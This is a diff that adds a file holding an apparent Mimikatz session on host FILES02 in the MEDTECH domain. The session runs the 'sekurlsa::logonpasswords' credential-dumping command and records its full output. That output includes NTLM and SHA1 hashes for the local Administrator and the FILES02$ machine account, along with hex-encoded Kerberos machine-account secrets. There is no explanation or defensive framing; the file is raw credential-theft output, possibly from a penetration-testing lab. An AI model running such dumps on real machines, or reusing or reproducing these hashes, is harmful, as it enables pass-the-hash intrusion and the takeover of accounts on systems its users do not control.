@@ -1,0 +1,227 @@
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 600252 (00000000:000928bc)
+Session           : Batch from 0
+User Name         : Administrator
+Domain            : FILES02
+Logon Server      : FILES02
+Logon Time        : 5/17/2023 6:37:55 PM
+SID               : S-1-5-21-617574027-3497765368-2664405491-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : FILES02
+         * NTLM     : f1014ac49bae005ee3ece5f47547d185
+         * SHA1     : 5e95d6c43e70e142df33af3b50ab0baa6ca02bad
+        tspkg :
+        wdigest :
+         * Username : Administrator
+         * Domain   : FILES02
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : FILES02
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 71499 (00000000:0001174b)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/17/2023 6:35:27 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : FILES02$
+         * Domain   : MEDTECH
+         * NTLM     : 2d462881aa2d4b42cdeb0e7bc2f25a83
+         * SHA1     : 93e02ca554b30cd4ef9f4ec369a3b8a7963b022a
+        tspkg :
+        wdigest :
+         * Username : FILES02$
+         * Domain   : MEDTECH
+         * Password : (null)
+        kerberos :
+         * Username : FILES02$
+         * Domain   : medtech.com
+         * Password : ed 45 13 bc cc d9 1f 61 20 67 29 5b c2 77 fb 99 a5 66 11 ca 52 dd bc a2 81 9d 95 00 35 8f fb 46 90 c3 2d 08 de f2 f3 d0 87 70 df e2 c6 ee 75 51 90 17 68 c1 49 12 a8 a1 b7 49 5e cf ab 83 81 b1 af 1e c4 a7 5f 89 71 aa bd dd a8 89 ae cf c1 91 8c 6d a9 86 c0 2a 46 65 25 97 8d ff 84 45 9d 04 3a 20 ad 99 66 73 61 75 82 88 87 4b 91 68 78 25 87 2a 47 48 c5 b5 b8 f9 5b 22 6b 98 6c 22 15 0d 2e c4 39 40 75 d5 14 b1 08 00 b3 b2 15 96 d4 ca 8e d6 d8 b4 7c 17 60 d7 fe 8b 2c 8d 53 4e a1 d8 46 76 75 27 26 75 2f 7f a5 3d ca 44 a5 a0 02 f3 bb c4 a6 4f ac 14 8d 4b ee ca 20 47 92 a0 7f 33 7c 91 5e 3a e6 3e 22 6f 85 72 02 13 3c 47 20 ce ef 2d 1f b0 e4 d4 f5 88 a8 72 f7 08 d4 d8 3c a1 b4 62 95 19 ed 86 c3 12 ea b0 bf ca c7 b6 83 96
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 71481 (00000000:00011739)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/17/2023 6:35:27 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : FILES02$
+         * Domain   : MEDTECH
+         * NTLM     : 62378e1d96bb64b13e84989bd6f4838a
+         * SHA1     : 2d529bbef66f397a3f80bdaa2bb5c34075019715
+        tspkg :
+        wdigest :
+         * Username : FILES02$
+         * Domain   : MEDTECH
+         * Password : (null)
+        kerberos :
+         * Username : FILES02$
+         * Domain   : medtech.com
+         * Password : ba e7 3d 05 ad 3d f9 0e 32 2f 6d db 80 42 6b ca 8b 21 05 4e 86 e9 7e 84 9f 00 66 88 f7 64 c0 6b 9e a6 1b 41 54 7e d1 24 20 68 39 da 2c 65 15 15 16 66 a7 8d 0a 63 56 ff dc 24 b6 83 bf 9f 7b 8f ba 2b 98 a4 e2 fd 91 d4 5e ac ec 2c 6a 32 64 7c 02 ff 9f 58 10 a1 c3 33 70 40 c2 7a e9 69 6f 91 70 54 27 c6 f2 65 19 79 90 d7 37 2b cc c1 dc e9 c9 d3 49 11 6d 29 e5 0c 83 46 ed 79 18 9f de 80 44 68 e8 a4 a3 18 7f d5 cb 91 95 23 4c a7 ce 3d 54 64 32 09 0f d9 f6 da e2 f6 7a 47 de 0e 8f a4 61 9d 3b 01 52 69 a1 a5 8a 73 3f f6 e2 63 d7 6c c5 5a 54 6c 7c ac 1a 86 7f ff 15 16 5a 91 8c 8d 71 14 f4 a2 1e 8a 46 45 20 7b 3d 73 69 fb e3 f0 59 42 9d 2b c1 a1 6e af 49 4d de 65 28 7f 04 0b 4a 49 33 44 31 1a 78 06 c7 7b a2 23 1d a5 ce 92
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : FILES02$
+Domain            : MEDTECH
+Logon Server      : (null)
+Logon Time        : 5/17/2023 6:35:26 PM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : FILES02$
+         * Domain   : MEDTECH
+         * NTLM     : 62378e1d96bb64b13e84989bd6f4838a
+         * SHA1     : 2d529bbef66f397a3f80bdaa2bb5c34075019715
+        tspkg :
+        wdigest :
+         * Username : FILES02$
+         * Domain   : MEDTECH
+         * Password : (null)
+        kerberos :
+         * Username : files02$
+         * Domain   : MEDTECH.COM
+         * Password : ba e7 3d 05 ad 3d f9 0e 32 2f 6d db 80 42 6b ca 8b 21 05 4e 86 e9 7e 84 9f 00 66 88 f7 64 c0 6b 9e a6 1b 41 54 7e d1 24 20 68 39 da 2c 65 15 15 16 66 a7 8d 0a 63 56 ff dc 24 b6 83 bf 9f 7b 8f ba 2b 98 a4 e2 fd 91 d4 5e ac ec 2c 6a 32 64 7c 02 ff 9f 58 10 a1 c3 33 70 40 c2 7a e9 69 6f 91 70 54 27 c6 f2 65 19 79 90 d7 37 2b cc c1 dc e9 c9 d3 49 11 6d 29 e5 0c 83 46 ed 79 18 9f de 80 44 68 e8 a4 a3 18 7f d5 cb 91 95 23 4c a7 ce 3d 54 64 32 09 0f d9 f6 da e2 f6 7a 47 de 0e 8f a4 61 9d 3b 01 52 69 a1 a5 8a 73 3f f6 e2 63 d7 6c c5 5a 54 6c 7c ac 1a 86 7f ff 15 16 5a 91 8c 8d 71 14 f4 a2 1e 8a 46 45 20 7b 3d 73 69 fb e3 f0 59 42 9d 2b c1 a1 6e af 49 4d de 65 28 7f 04 0b 4a 49 33 44 31 1a 78 06 c7 7b a2 23 1d a5 ce 92
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 41527 (00000000:0000a237)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 5/17/2023 6:35:26 PM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : FILES02$
+         * Domain   : MEDTECH
+         * NTLM     : 62378e1d96bb64b13e84989bd6f4838a
+         * SHA1     : 2d529bbef66f397a3f80bdaa2bb5c34075019715
+        tspkg :
+        wdigest :
+         * Username : FILES02$
+         * Domain   : MEDTECH
+         * Password : (null)
+        kerberos :
+         * Username : FILES02$
+         * Domain   : medtech.com
+         * Password : ba e7 3d 05 ad 3d f9 0e 32 2f 6d db 80 42 6b ca 8b 21 05 4e 86 e9 7e 84 9f 00 66 88 f7 64 c0 6b 9e a6 1b 41 54 7e d1 24 20 68 39 da 2c 65 15 15 16 66 a7 8d 0a 63 56 ff dc 24 b6 83 bf 9f 7b 8f ba 2b 98 a4 e2 fd 91 d4 5e ac ec 2c 6a 32 64 7c 02 ff 9f 58 10 a1 c3 33 70 40 c2 7a e9 69 6f 91 70 54 27 c6 f2 65 19 79 90 d7 37 2b cc c1 dc e9 c9 d3 49 11 6d 29 e5 0c 83 46 ed 79 18 9f de 80 44 68 e8 a4 a3 18 7f d5 cb 91 95 23 4c a7 ce 3d 54 64 32 09 0f d9 f6 da e2 f6 7a 47 de 0e 8f a4 61 9d 3b 01 52 69 a1 a5 8a 73 3f f6 e2 63 d7 6c c5 5a 54 6c 7c ac 1a 86 7f ff 15 16 5a 91 8c 8d 71 14 f4 a2 1e 8a 46 45 20 7b 3d 73 69 fb e3 f0 59 42 9d 2b c1 a1 6e af 49 4d de 65 28 7f 04 0b 4a 49 33 44 31 1a 78 06 c7 7b a2 23 1d a5 ce 92
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 40348 (00000000:00009d9c)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 5/17/2023 6:35:24 PM
+SID               :
+        msv :
+         [00000003] Primary
+         * Username : FILES02$
+         * Domain   : MEDTECH
+         * NTLM     : 62378e1d96bb64b13e84989bd6f4838a
+         * SHA1     : 2d529bbef66f397a3f80bdaa2bb5c34075019715
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 5/17/2023 6:35:27 PM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 41478 (00000000:0000a206)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 5/17/2023 6:35:26 PM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : FILES02$
+         * Domain   : MEDTECH
+         * NTLM     : 62378e1d96bb64b13e84989bd6f4838a
+         * SHA1     : 2d529bbef66f397a3f80bdaa2bb5c34075019715
+        tspkg :
+        wdigest :
+         * Username : FILES02$
+         * Domain   : MEDTECH
+         * Password : (null)
+        kerberos :
+         * Username : FILES02$
+         * Domain   : medtech.com
+         * Password : ba e7 3d 05 ad 3d f9 0e 32 2f 6d db 80 42 6b ca 8b 21 05 4e 86 e9 7e 84 9f 00 66 88 f7 64 c0 6b 9e a6 1b 41 54 7e d1 24 20 68 39 da 2c 65 15 15 16 66 a7 8d 0a 63 56 ff dc 24 b6 83 bf 9f 7b 8f ba 2b 98 a4 e2 fd 91 d4 5e ac ec 2c 6a 32 64 7c 02 ff 9f 58 10 a1 c3 33 70 40 c2 7a e9 69 6f 91 70 54 27 c6 f2 65 19 79 90 d7 37 2b cc c1 dc e9 c9 d3 49 11 6d 29 e5 0c 83 46 ed 79 18 9f de 80 44 68 e8 a4 a3 18 7f d5 cb 91 95 23 4c a7 ce 3d 54 64 32 09 0f d9 f6 da e2 f6 7a 47 de 0e 8f a4 61 9d 3b 01 52 69 a1 a5 8a 73 3f f6 e2 63 d7 6c c5 5a 54 6c 7c ac 1a 86 7f ff 15 16 5a 91 8c 8d 71 14 f4 a2 1e 8a 46 45 20 7b 3d 73 69 fb e3 f0 59 42 9d 2b c1 a1 6e af 49 4d de 65 28 7f 04 0b 4a 49 33 44 31 1a 78 06 c7 7b a2 23 1d a5 ce 92
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : FILES02$
+Domain            : MEDTECH
+Logon Server      : (null)
+Logon Time        : 5/17/2023 6:35:24 PM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : FILES02$
+         * Domain   : MEDTECH
+         * Password : (null)
+        kerberos :
+         * Username : files02$
+         * Domain   : MEDTECH.COM
+         * Password : ba e7 3d 05 ad 3d f9 0e 32 2f 6d db 80 42 6b ca 8b 21 05 4e 86 e9 7e 84 9f 00 66 88 f7 64 c0 6b 9e a6 1b 41 54 7e d1 24 20 68 39 da 2c 65 15 15 16 66 a7 8d 0a 63 56 ff dc 24 b6 83 bf 9f 7b 8f ba 2b 98 a4 e2 fd 91 d4 5e ac ec 2c 6a 32 64 7c 02 ff 9f 58 10 a1 c3 33 70 40 c2 7a e9 69 6f 91 70 54 27 c6 f2 65 19 79 90 d7 37 2b cc c1 dc e9 c9 d3 49 11 6d 29 e5 0c 83 46 ed 79 18 9f de 80 44 68 e8 a4 a3 18 7f d5 cb 91 95 23 4c a7 ce 3d 54 64 32 09 0f d9 f6 da e2 f6 7a 47 de 0e 8f a4 61 9d 3b 01 52 69 a1 a5 8a 73 3f f6 e2 63 d7 6c c5 5a 54 6c 7c ac 1a 86 7f ff 15 16 5a 91 8c 8d 71 14 f4 a2 1e 8a 46 45 20 7b 3d 73 69 fb e3 f0 59 42 9d 2b c1 a1 6e af 49 4d de 65 28 7f 04 0b 4a 49 33 44 31 1a 78 06 c7 7b a2 23 1d a5 ce 92
+        ssp :
+        credman :
+        cloudap :
+
+mimikatz #
+
+
+
+
+
+
